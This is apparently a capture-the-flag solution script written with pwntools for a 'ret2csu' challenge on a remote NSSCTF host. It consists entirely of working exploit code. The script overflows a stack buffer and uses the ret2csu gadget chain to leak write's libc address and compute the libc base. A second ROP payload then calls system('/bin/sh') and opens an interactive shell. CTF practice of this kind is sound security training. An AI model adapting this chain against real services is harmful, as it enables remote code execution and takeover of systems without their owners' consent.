from pwn import *

context(log_level='debug',arch='amd64', os='linux')
# sh = process('./ret2csu')
sh = remote("node5.anna.nssctf.cn",23343)

libc =  ELF('./libc.so.6')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  
ret2csu = ELF('./ret2csu')

write_got = ret2csu.got['write']
return_addr = ret2csu.symbols['vuln']

pop_rdi_ret = 0x00000000004012b3
pop_rsi_r15_ret = 0x00000000004012b1

write_sym = 0x404018
pop_rbx_addr = 0x4012AA 
rbx = 0
rbp = 1
r12 = 1 
r13 = write_got 
r14 = 8 
r15 = write_sym 
mov_rdx_r14_addr = 0x401290 
payload = b'a'*264
payload += flat([pop_rbx_addr , rbx , rbp , r12 , r13 , r14 , r15 , mov_rdx_r14_addr])
payload += p64(0xdeadbeef)*7 + p64(return_addr)

delimiter = 'Input:\n'
sh.sendlineafter(delimiter, payload)

sh.recvuntil(b'Ok.\n')
write_addr = u64(sh.recv(6).ljust(8,b'\x00'))

success('wirte_addr:'+hex(write_addr))
libc_base = write_addr - libc.sym['write']

print('libc_base',hex(libc_base))
system_addr = libc_base + libc.sym['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

success('libc_base:'+hex(libc_base))
ret_addr = 0x000000000040101a
payload2 = b'a'*264 + p64(ret_addr) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)

sh.sendline(payload2)
sh.interactive()